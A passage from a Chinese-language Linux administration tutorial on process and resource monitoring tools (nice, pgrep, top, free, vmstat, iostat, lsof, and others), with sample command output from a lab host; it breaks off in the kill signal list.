1<br>        pgrp: 16642                         session: 16642<br>      tty_nr: 0                               tpgid: -1<br>       flags: 404040                         minflt: 307<br>     cminflt: 0                              majflt: 0<br>     cmajflt: 0                               utime: 290<br>       stime: 331                            cutime: 0<br>      cstime: 0                            priority: 20<br>        <span class="hljs-built_in">nice</span>: 0                         num_threads: 1<br> itrealvalue: 0                           starttime: 21243019<br>       vsize: 119353344                         rss: 1365<br>      rsslim: 18446744073709551615             startcode: 4194304<br>     endcode: 4967936                    startstack: 140721176867168<br>     kstkesp: 0                             kstkeip: 0<br>       wchan: 0                               nswap: 0<br>      cnswap: 0                         exit_signal: 17<br>   processor: 1                         rt_priority: 0<br>      policy: 0               delayaccr_blkio_ticks: 0<br>  guest_time: 0                         cguest_time: 0<br></code></pre></td></tr></table></figure><h3 id="2-4-设置和调整进程优先级"><a href="#2-4-设置和调整进程优先级" class="headerlink" title="2.4 设置和调整进程优先级"></a>2.4 设置和调整进程优先级</h3><blockquote><p>进程优先级调整</p><ul><li>静态优先级：100-139</li><li>进程默认启动时的nice值为0，优先级为120</li><li>只有根用户才能降低nice值（提高优先性）</li></ul></blockquote><h4 id="2-4-1-nice-以指定的优先级来启动进程"><a href="#2-4-1-nice-以指定的优先级来启动进程" class="headerlink" title="2.4.1 nice 以指定的优先级来启动进程"></a>2.4.1 nice 以指定的优先级来启动进程</h4><h4 id="2-4-2-renice-可以调整正在执行中的进程的优先级"><a href="#2-4-2-renice-可以调整正在执行中的进程的优先级" class="headerlink" title="2.4.2 renice 可以调整正在执行中的进程的优先级"></a>2.4.2 renice 可以调整正在执行中的进程的优先级</h4><h4 id="范例：使用方法"><a href="#范例：使用方法" class="headerlink" title="范例：使用方法"></a>范例：使用方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看优先级ni</span><br>[root@rocky01 ~]<span class="hljs-comment"># ps axo pid,comm,ni</span><br><br><span class="hljs-comment">#nice</span><br>[root@rocky01 ~]<span class="hljs-comment"># nice -n -10 ping 127.0.0.1</span><br>[root@rocky01 ~]<span class="hljs-comment"># ps axo pid,cmd,nice |grep ping</span><br>  2118 ping 127.0.0.1              -10<br>  2120 grep --color=auto ping        0<br><br><span class="hljs-comment">#renice</span><br>[root@rocky01 ~]<span class="hljs-comment"># renice -n -20 2118</span><br>2106 (process ID) old priority -10, new priority -20<br>[root@rocky01 ~]<span class="hljs-comment"># ps axo pid,cmd,nice |grep ping</span><br>  2118 ping 127.0.0.1              -20<br>  2200 grep --color=auto ping        0<br></code></pre></td></tr></table></figure><h3 id="2-5-搜索进程"><a href="#2-5-搜索进程" class="headerlink" title="2.5 搜索进程"></a>2.5 搜索进程</h3><blockquote><p>按条件搜索进程</p><ol><li>ps 选项　| grep “ “</li><li>pgrep 按预定义的模式</li><li>/sbin/pidof 按确切的程序名称查看pid</li></ol></blockquote><h4 id="2-5-1-pgrep"><a href="#2-5-1-pgrep" class="headerlink" title="2.5.1 pgrep"></a>2.5.1 pgrep</h4><p> 格式：<code>pgrep [options] pattern</code></p><blockquote><p> 常用选项：</p><ul><li>-u uid: effective user，生效者</li><li>-U uid: real user，真正发起运行命令者</li><li>-t terminal: 与指定终端相关的进程</li><li>-l: 显示进程名</li><li>-a: 显示完整格式的进程名</li><li>-P pid: 显示指定进程的子进程</li></ul></blockquote><h4 id="范例：使用方法-1"><a href="#范例：使用方法-1" class="headerlink" title="范例：使用方法"></a>范例：使用方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># pgrep -lu root</span><br></code></pre></td></tr></table></figure><h4 id="2-5-2-pidof"><a href="#2-5-2-pidof" class="headerlink" title="2.5.2 pidof"></a>2.5.2 pidof</h4><p> 格式：<code>pidof [options] [program [...]]</code></p><p> 选项：<code>-x 按脚本名称查找pid</code></p><h4 id="范例：使用方法-2"><a href="#范例：使用方法-2" class="headerlink" title="范例：使用方法"></a>范例：使用方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># pidof httpd</span><br>16761 16645 16644 16643 16642<br><br>[root@rocky01 ~]<span class="hljs-comment"># cat ping.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br>ping 127.0.0.1<br><br><span class="hljs-comment">#ping.sh必须有shebang机制,否则pidof -x 也无法查找到</span><br>[root@rocky01 ~]<span class="hljs-comment"># pidof -x ping.sh </span><br>19035<br></code></pre></td></tr></table></figure><h3 id="2-6-uptime-负载查询"><a href="#2-6-uptime-负载查询" class="headerlink" title="2.6 uptime 负载查询"></a>2.6 uptime 负载查询</h3><blockquote><p> /proc/uptime 包括两个值，单位 s</p><ul><li>第一个值表示：系统启动时长</li><li>第二个值表示：空闲进程的总时长（按总的CPU核数计算）</li></ul><p>uptime 和 w 显示以下内容</p><ul><li>当前时间</li><li>系统已启动的时间</li><li>当前上线人数</li><li>系统平均负载（1、5、15分钟的平均负载，一般不会超过1，超过5时建议警报）</li></ul></blockquote><h4 id="案例：系统平均负载"><a href="#案例：系统平均负载" class="headerlink" title="案例：系统平均负载"></a>案例：<strong>系统平均负载</strong></h4><p><strong>指在特定时间间隔内运行队列中的平均进程数,通常每个CPU内核的当前活动进程数不大于3，那么系统的性能良好。如果每个CPU内核的任务数大于5，那么此主机的性能有严重问题</strong></p><p>如：linux主机是1个双核CPU，当Load Average 为6的时候说明机器已经被充分使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># uptime</span><br> 15:13:15 up  9:13,  1 user,  load average: 0.04, 0.02, 0.00<br> <br>[root@rocky01 ~]<span class="hljs-comment"># w</span><br> 15:14:30 up  9:14,  1 user,  load average: 0.06, 0.03, 0.00<br>...省略...<br><br>[root@rocky01 ~]<span class="hljs-comment"># top</span><br>top - 15:14:41 up  9:14,  1 user,  load average: 0.05, 0.03, 0.00<br>...省略...<br><br><span class="hljs-comment">#load average：系统负载平均在过去的1、5和15分钟内忙不忙</span><br><span class="hljs-comment">#值一般超过5就会使系统变慢</span><br></code></pre></td></tr></table></figure><h3 id="2-7-mpstat-显示CPU相关统计"><a href="#2-7-mpstat-显示CPU相关统计" class="headerlink" title="2.7 mpstat 显示CPU相关统计"></a>2.7 mpstat 显示CPU相关统计</h3><p>来自于sysstat包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#间隔2秒执行3此</span><br>[root@rocky01 ~]<span class="hljs-comment"># mpstat 2 3</span><br>Linux 4.18.0-372.9.1.el8.x86_64 (rocky01) 09/02/2022 _x86_64_(2 CPU)<br><br>10:34:06 PM  CPU    %usr   %<span class="hljs-built_in">nice</span>    %sys %iowait    %irq   %soft  %steal  %guest  %gnice   %idle<br>10:34:08 PM  all    0.00    0.00    0.25    0.00    0.25    0.25    0.00    0.00    0.00   99.25<br>10:34:10 PM  all    0.00    0.00    0.00    0.00    0.25    0.00    0.00    0.00    0.00   99.75<br>10:34:12 PM  all    0.00    0.00    0.25    0.00    0.00    0.00    0.00    0.00    0.00   99.75<br>Average:     all    0.00    0.00    0.17    0.00    0.17    0.08    0.00    0.00    0.00   99.58<br></code></pre></td></tr></table></figure><h3 id="2-8-top、htop-查看进程实时状态"><a href="#2-8-top、htop-查看进程实时状态" class="headerlink" title="2.8 top、htop 查看进程实时状态"></a>2.8 top、htop 查看进程实时状态</h3><h4 id="2-8-1-top"><a href="#2-8-1-top" class="headerlink" title="2.8.1 top"></a>2.8.1 top</h4><p><a href="https://img2022.cnblogs.com/blog/2927659/202209/2927659-20220902224737097-1314413739.png"><img src="2927659-20220902224737097-1314413739.png" alt="img"></a></p><blockquote><p>常见选项</p><ul><li>-d #指定刷新时间间隔，默认为3秒</li><li>-b #全部显示所有进程</li><li>-n #刷新多少次后退出</li><li>-H #线程模式</li></ul><p>排序：</p><ul><li>P：以占据的CPU百分比,%CPU</li><li>M：占据内存百分比,%MEM</li><li>T：累积占据CPU时长,TIME+</li></ul><p>首部信息显示：</p><ul><li><p>uptime信息：l命令</p></li><li><p>tasks及cpu信息：t命令</p></li><li><p>cpu分别显示：1 (数字)</p></li><li><p>memory信息：m命令</p></li><li><p>退出命令：q</p></li><li><p>修改刷新时间间隔：s</p></li><li><p>终止指定进程：k</p></li><li><p>保存文件：W</p></li></ul></blockquote><h4 id="2-8-2-htop"><a href="#2-8-2-htop" class="headerlink" title="2.8.2 htop"></a>2.8.2 htop</h4><p><a href="https://img2022.cnblogs.com/blog/2927659/202209/2927659-20220902230213674-718903061.png"><img src="2927659-20220902230213674-718903061.png" alt="img"></a></p><h3 id="2-9-free-内存空间"><a href="#2-9-free-内存空间" class="headerlink" title="2.9 free 内存空间"></a>2.9 free 内存空间</h3><blockquote><p>向/proc/sys/vm/drop_caches中写入相应的修改值，会清理缓存。建议先执行sync（sync 命令将所有未写的系统缓冲区写到磁盘中，包含已修改的 i-node、已延迟的块 I/O 和读写映射文件）。执行echo1、2、3 至 /proc/sys/vm/drop_caches, 达到不同的清理目的</p><p>如果因为是应用有像内存泄露、溢出的问题时，从swap的使用情况是可以比较快速可以判断的，但通过执行free 反而比较难查看。但核心并不会因为内存泄露等问题并没有快速清空buffer或cache（默认值是0），生产也不应该随便去改变此值。</p><p>一般情况下，应用在系统上稳定运行了，free值也会保持在一个稳定值的。当发生内存不足、应用获取不到可用内存、OOM错误等问题时，还是更应该去分析应用方面的原因，否则，清空buffer，强制腾出free的大小，可能只是把问题给暂时屏蔽了。</p><p>排除内存不足的情况外，除非是在软件开发阶段，需要临时清掉buffer，以判断应用的内存使用情况；或应用已经不再提供支持，即使应用对内存的时候确实有问题，而且无法避免的情况下，才考虑定时清空buffer。</p><p>常用选项</p><ul><li>-b 以字节为单位</li><li>-m 以MB为单位</li><li>-g 以GB为单位</li><li>-h 易读格式</li><li>-o 不显示-/+buffers/cache行</li><li>-t  显示RAM + swap的总和</li><li>-s n 刷新间隔为n秒</li><li>-c n 刷新n次后即退出</li></ul></blockquote><h4 id="范例：清理缓存"><a href="#范例：清理缓存" class="headerlink" title="范例：清理缓存"></a>范例：清理缓存</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># cat /proc/sys/vm/drop_caches</span><br>0<br>[root@rocky01 ~]<span class="hljs-comment"># free -h</span><br>              total        used        free      shared  buff/cache   available<br>Mem:          3.6Gi       238Mi       3.0Gi       8.0Mi       399Mi       3.2Gi<br>Swap:         3.9Gi          0B       3.9Gi<br>[root@rocky01 ~]<span class="hljs-comment"># echo 3 &gt; /proc/sys/vm/drop_caches</span><br>[root@rocky01 ~]<span class="hljs-comment"># free -h</span><br>              total        used        free      shared  buff/cache   available<br>Mem:          3.6Gi       221Mi       3.3Gi       8.0Mi       112Mi       3.2Gi<br>Swap:         3.9Gi          0B       3.9Gi<br></code></pre></td></tr></table></figure><h3 id="2-10-pmap-进程对应的内存映射"><a href="#2-10-pmap-进程对应的内存映射" class="headerlink" title="2.10 pmap 进程对应的内存映射"></a>2.10 pmap 进程对应的内存映射</h3><p>格式：<code>pmap [options] pid [...]</code></p><p>选项：<code>-x: 显示详细格式的信息</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用方法1</span><br>[root@rocky01 ~]<span class="hljs-comment"># pmap -x PID</span><br><br><span class="hljs-comment">#使用方法2</span><br>[root@rocky01 ~]<span class="hljs-comment"># cat /proc/PID/maps</span><br></code></pre></td></tr></table></figure><h3 id="2-11-vmstat-虚拟内存信息"><a href="#2-11-vmstat-虚拟内存信息" class="headerlink" title="2.11 vmstat 虚拟内存信息"></a>2.11 vmstat 虚拟内存信息</h3><p>格式：<code>vmstat [options] [delay [count]]</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># vmstat</span><br>procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----<br> r  b   swpd   free   buff  cache   si   so    bi    bo   <span class="hljs-keyword">in</span>   cs us sy <span class="hljs-built_in">id</span> wa st<br> 2  0    0    3415076   0   125060   0    0    45     9  112  181  0  1 99  0  0<br><br>procs<br>     r：可运行（正运行或等待运行）进程的个数，和核心数有关<br>     b：处于不可中断睡眠态的进程个数(被阻塞的队列的长度)<br>memory<br>     swpd: 交换内存的使用总量<br>     free：空闲物理内存总量<br>     buffer：用于buffer的内存总量<br>     cache：用于cache的内存总量<br>swap<br>     si：从磁盘交换进内存的数据速率(kb/s)<br>     so：从内存交换至磁盘的数据速率(kb/s)<br>io<br>     bi：从块设备读入数据到系统的速率(kb/s)<br>     bo: 保存数据至块设备的速率<br>system<br>     <span class="hljs-keyword">in</span>: interrupts 中断速率，包括时钟<br>     cs: context switch     进程切换速率<br>cpu<br>     us:Time spent running non-kernel code<br>     sy: Time spent running kernel code<br>     <span class="hljs-built_in">id</span>: Time spent idle. Linux 2.5.41前,包括IO-<span class="hljs-built_in">wait</span> time.<br>     wa: Time spent waiting <span class="hljs-keyword">for</span> IO.  2.5.41前，包括<span class="hljs-keyword">in</span> idle.<br>     st: Time stolen from a virtual machine.  2.6.11前, unknown.<br></code></pre></td></tr></table></figure><h3 id="2-12-iostat-统计CPU和设备IO信息"><a href="#2-12-iostat-统计CPU和设备IO信息" class="headerlink" title="2.12 iostat 统计CPU和设备IO信息"></a>2.12 iostat 统计CPU和设备IO信息</h3><p>iostat 可以提供更丰富的IO性能状态数据</p><p>此工具由sysstat包提供</p><blockquote><p>常用选项:</p><ul><li>-c 只显示CPU行</li><li>-d 显示设备〈磁盘)使用状态</li><li>-k 以千字节为为单位显示输出</li><li>-t 在输出中包括时间戳</li><li>-x 在输出中包括扩展的磁盘指标</li></ul></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># iostat</span><br>Linux 4.18.0-372.9.1.el8.x86_64 (rocky01) 09/02/2022 _x86_64_(2 CPU)<br><br>avg-cpu:  %user   %<span class="hljs-built_in">nice</span> %system %iowait  %steal   %idle<br>           0.07    0.01    0.65    0.02    0.00   99.25<br><br>Device             tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn<br>sda               3.18        79.02        15.72     365404      72707<br>scd0              0.03         0.37         0.00       1693          0<br>dm-0              2.58        67.25        14.83     310990      68574<br>dm-1              0.02         0.48         0.00       2220          0<br>dm-2              0.20         0.59         0.44       2749       2048<br><br><br>----------------------------------------------------------------------------<br>tps：该设备每秒的传输次数（Indicate the number of transfers per second that were issued to the device.）。<br><span class="hljs-string">&quot;一次传输&quot;</span>意思是<span class="hljs-string">&quot;一次I/O请求&quot;</span>。多个逻辑请求可能会被合并为<span class="hljs-string">&quot;一次I/O请求&quot;</span>。<span class="hljs-string">&quot;一次传输&quot;</span>请求的大小是未知的。<br><br>kB_read/s：每秒从设备（drive expressed）读取的数据量；<br>kB_wrtn/s：每秒向设备（drive expressed）写入的数据量；<br>kB_read：读取的总数据量；<br>kB_wrtn：写入的总数量数据量；<br>这些单位都为Kilobytes。<br></code></pre></td></tr></table></figure><h3 id="2-13-iotop-监视磁盘I-O"><a href="#2-13-iotop-监视磁盘I-O" class="headerlink" title="2.13 iotop 监视磁盘I/O"></a>2.13 iotop 监视磁盘I/O</h3><p>iotop命令是一个用来监视磁盘I/O使用状况的top类工具iotop具有与top相似的UI，其中包括PID、用户、I/O、进程等相关信息，可查看每个进程是如何使用IO</p><blockquote><p>第一行：Read和Write速率总计</p><p>第二行：实际的Read和Write速率</p><p>第三行：参数如下：</p><ul><li>线程ID（按p切换为进程ID）</li><li>优先级</li><li>用户</li><li>磁盘读速率</li><li>磁盘写速率</li><li>swap交换百分比</li><li>IO等待所占的百分比</li></ul></blockquote><p><a href="https://img2022.cnblogs.com/blog/2927659/202209/2927659-20220903144156287-876239960.png"><img src="2927659-20220903144156287-876239960.png" alt="img"></a></p><h3 id="2-14-iftop-显示网络带宽使用情况"><a href="#2-14-iftop-显示网络带宽使用情况" class="headerlink" title="2.14 iftop 显示网络带宽使用情况"></a>2.14 iftop 显示网络带宽使用情况</h3><h3 id="2-15-nload-查看网络实时吞吐量"><a href="#2-15-nload-查看网络实时吞吐量" class="headerlink" title="2.15 nload 查看网络实时吞吐量"></a>2.15 nload 查看网络实时吞吐量</h3><p>nload 是一个实时监控网络流量和带宽使用情况，以数值和动态图展示进出的流量情况,通过EPEL源安装界面操作</p><blockquote><ul><li>上下方向键、左右方向键、enter键或者tab键都就可以切换查看多个网卡的流量情况</li><li>按 F2 显示选项窗口</li><li>按 q 或者 Ctrl+C 退出 nload</li></ul></blockquote><p><a href="https://img2022.cnblogs.com/blog/2927659/202209/2927659-20220903141633809-1993558218.png"><img src="2927659-20220903141633809-1993558218.png" alt="img"></a></p><h3 id="2-16-nethogs-查看进程网络带宽的使用情况"><a href="#2-16-nethogs-查看进程网络带宽的使用情况" class="headerlink" title="2.16 nethogs 查看进程网络带宽的使用情况"></a>2.16 nethogs 查看进程网络带宽的使用情况</h3><p>NetHogs是一个开源的命令行工具（类似于Linux的top命令），用来按进程或程序实时统计网络带宽使用率。</p><p><a href="https://img2022.cnblogs.com/blog/2927659/202209/2927659-20220903144807560-580899557.png"><img src="2927659-20220903144807560-580899557.png" alt="img"></a></p><h3 id="2-17-iptraf-ng-网络监视工具"><a href="#2-17-iptraf-ng-网络监视工具" class="headerlink" title="2.17 iptraf-ng 网络监视工具"></a>2.17 iptraf-ng 网络监视工具</h3><p><a href="https://img2022.cnblogs.com/blog/2927659/202209/2927659-20220903145023550-413858000.png"><img src="2927659-20220903145023550-413858000.png" alt="img"></a></p><h3 id="2-18-dstat-系统资源统计"><a href="#2-18-dstat-系统资源统计" class="headerlink" title="2.18 dstat 系统资源统计"></a>2.18 dstat 系统资源统计</h3><p>dstat由pcp-system-tools包提供，但安装dstat包即可, 可用于代替 vmstat,iostat功能</p><p>格式：<code>dstat [-afv] [options..] [delay [count]]</code></p><blockquote><p>常用选项</p><ul><li>-c 显示cpu相关信息</li><li>-C #,#,…,total</li><li>-d 显示disk相关信息</li><li>-D total,sda,sdb,…</li><li>-g 显示page相关统计数据</li><li>-m 显示memory相关统计数据</li><li>-n 显示network相关统计数据</li><li>-p 显示process相关统计数据</li><li>-r 显示io请求相关的统计数据</li><li>-s 显示swapped相关的统计数据</li><li>–tcp</li><li>–udp</li><li>–unix</li><li>–raw</li><li>–socket</li><li>–ipc</li><li>–top-cpu：显示最占用CPU的进程</li><li>–top-io: 显示最占用io的进程</li><li>–top-mem: 显示最占用内存的进程</li><li>–top-latency: 显示延迟最大的进程</li></ul></blockquote><p><a href="https://img2022.cnblogs.com/blog/2927659/202209/2927659-20220903004441174-1034827746.png"><img src="2927659-20220903004441174-1034827746.png" alt="img"></a></p><h3 id="2-19-glances-综合监控工具"><a href="#2-19-glances-综合监控工具" class="headerlink" title="2.19 glances 综合监控工具"></a>2.19 glances 综合监控工具</h3><p>此工具可以通过EPEL源安装,CentOS 8 目前已提供,但测试有问题</p><blockquote><p>常用选项：</p><ul><li>-b: 以Byte为单位显示网卡数据速率</li><li>-d: 关闭磁盘I/O模块</li><li>-f /path/to/somefile: 设定输入文件位置</li><li>-o {HTML|CSV}：输出格式</li><li>-m: 禁用mount模块</li><li>-n: 禁用网络模块</li><li>-t #: 延迟时间间隔</li><li>-1：每个CPU的相关数据单独显示</li></ul></blockquote><p><a href="https://img2022.cnblogs.com/blog/2927659/202209/2927659-20220903145731828-976278310.png"><img src="2927659-20220903145731828-976278310.png" alt="img"></a></p><h3 id="2-20-lsof-查看进程打开文件"><a href="#2-20-lsof-查看进程打开文件" class="headerlink" title="2.20 lsof 查看进程打开文件"></a>2.20 lsof 查看进程打开文件</h3><blockquote><p>选项</p><ul><li>-a：列出打开文件存在的进程</li><li>-c&lt;进程名&gt;：列出指定进程所打开的文件</li><li>-g：列出GID号进程详情</li><li>-d&lt;文件号&gt;：列出占用该文件号的进程</li><li>+d&lt;目录&gt;：列出目录下被打开的文件</li><li>+D&lt;目录&gt;：递归列出目录下被打开的文件</li><li>-n&lt;目录&gt;：列出使用NFS的文件</li><li><strong>-i&lt;条件&gt;：列出符合条件的进程(4、6、协议、:端口、 @ip )</strong></li><li>-p&lt;进程号&gt;：列出指定进程号所打开的文件</li><li>-u：列出UID号进程详情</li><li>-h：显示帮助信息</li><li>-v：显示版本信息。</li><li>-n: 不反向解析网络名字</li></ul></blockquote><h4 id="范例：使用方法-3"><a href="#范例：使用方法-3" class="headerlink" title="范例：使用方法"></a>范例：使用方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看当前哪个进程正在使用此文件</span><br>[root@rocky01 ~]<span class="hljs-comment"># lsof /var/log/messages</span><br>COMMAND PID USER   FD   TYPE DEVICE SIZE/OFF     NODE NAME<br>rsyslogd 915 root   5w   REG    8,2  1419936 134802547 /var/log/messages<br><br><span class="hljs-comment">#指定进程号，可以查看该进程打开的文件</span><br>[root@rocky01 ~]<span class="hljs-comment"># lsof -p 9527</span><br><br><span class="hljs-comment">#查看指定程序打开的文件</span><br>[root@rocky01 ~]<span class="hljs-comment"># lsof -c httpd</span><br><br><span class="hljs-comment">#查看指定用户打开的文件</span><br>lsof -u root | more<br><br><span class="hljs-comment">#查看所有网络连接，通过参数-i查看网络连接的情况，包括连接的ip、端口等以及一些服务的连接情况</span><br><span class="hljs-comment">#例如：sshd等。也可以通过指定ip查看该ip的网络连接情况</span><br>lsof -i –n      <br>lsof -i@127.0.0.1<br></code></pre></td></tr></table></figure><h4 id="范例：恢复正在使用中的误删除的文件"><a href="#范例：恢复正在使用中的误删除的文件" class="headerlink" title="范例：恢复正在使用中的误删除的文件"></a>范例：恢复正在使用中的误删除的文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">一、此文件必须要被打开<br>[root@rocky01 ~]<span class="hljs-comment"># cat Willoneday.txt</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;lsof test!&quot;</span><br>[root@rocky01 ~]<span class="hljs-comment"># tail -f Willoneday.txt &amp;</span><br>[1] 18189<br><br>二、删除此文件<br>[root@rocky01 ~]<span class="hljs-comment"># lsof Willoneday.txt</span><br>COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF      NODE NAME<br><span class="hljs-built_in">tail</span>    18189 root    3r   REG  253,0       18 201392493 Willoneday.txt<br>[root@rocky01 ~]<span class="hljs-comment"># rm -rf Willoneday.txt</span><br>[root@rocky01 ~]<span class="hljs-comment"># cat Willoneday.txt</span><br><span class="hljs-built_in">cat</span>: Willoneday.txt: No such file or directory<br><br>三、找到此文件PID，进入fd（打开文件描述符），找到对应文件标识，重定向即可<br>[root@rocky01 ~]<span class="hljs-comment"># lsof |grep delete</span><br><span class="hljs-built_in">tail</span>      18189                   root    3r      REG              253,0       18  201392493 /root/Willoneday.txt (deleted)<br>[root@rocky01 ~]<span class="hljs-comment"># ll /proc/18189/fd/</span><br>total 0<br>lrwx------ 1 root root 64 Sep  3 01:11 0 -&gt; /dev/pts/0<br>lrwx------ 1 root root 64 Sep  3 01:11 1 -&gt; /dev/pts/0<br>lrwx------ 1 root root 64 Sep  3 01:11 2 -&gt; /dev/pts/0<br>lr-x------ 1 root root 64 Sep  3 01:11 3 -&gt; <span class="hljs-string">&#x27;/root/Willoneday.txt (deleted)&#x27;</span><br>lr-x------ 1 root root 64 Sep  3 01:11 4 -&gt; anon_inode:inotify<br>[root@rocky01 ~]<span class="hljs-comment"># cat /proc/18189/fd/3 &gt; Willoneday.txt</span><br>[root@rocky01 ~]<span class="hljs-comment"># cat Willoneday.txt</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;lsof test!&quot;</span><br></code></pre></td></tr></table></figure><h3 id="2-21-信号发送"><a href="#2-21-信号发送" class="headerlink" title="2.21 信号发送"></a>2.21 信号发送</h3><h4 id="2-21-1-kill"><a href="#2-21-1-kill" class="headerlink" title="2.21.1 kill"></a>2.21.1 kill</h4><p>kill：内部命令，可用来向进程发送控制信号，以实现对进程管理,每个信号对应一个数字，信号名称以SIG开头（可省略），不区分大小写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#显示当前系统可用信号：</span><br>[root@rocky01 ~]<span class="hljs-comment"># kill -L</span><br> 1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP<br> 6) SIGABRT 7) SIGBUS 8) SIGFPE 9) SIGKILL10) SIGUSR1<br>11) SIGSEGV12) SIGUSR213) SIGPIPE14) SIGALRM15) SIGTERM<br>16) SIGSTKFLT17) SIGCHLD18) SIGCONT19) SIGSTOP20) SIGTSTP<br>21) SIGTTIN22) SIGTTOU23) SIGURG24) SIGXCPU25) SIGXFSZ<br>26) SIGVTALRM27) SIGPROF28) SIGWINCH29) SIGIO30) SIGPWR<br>31) SIGSYS34) SIGRTMIN35) SIGRTMIN+136) SIGRTMIN+237) SIGRTMIN+3<br>38) SIGRTMIN+439) SIGRTMIN+540) SIGRTMIN+641) SIGRTMIN+742) SIGRTMIN+8<br>43) SIGRTMIN+944) SIGRTMIN+1045) SIGRTMIN+1146) SIGRTMIN+1247) SIGRTMIN+13<br>48) SIGRTMIN+1449) SIGRTMIN+1550) SIGRTMAX-1451) SIGRTMAX-1352) SIGRTMAX-12<br>53) 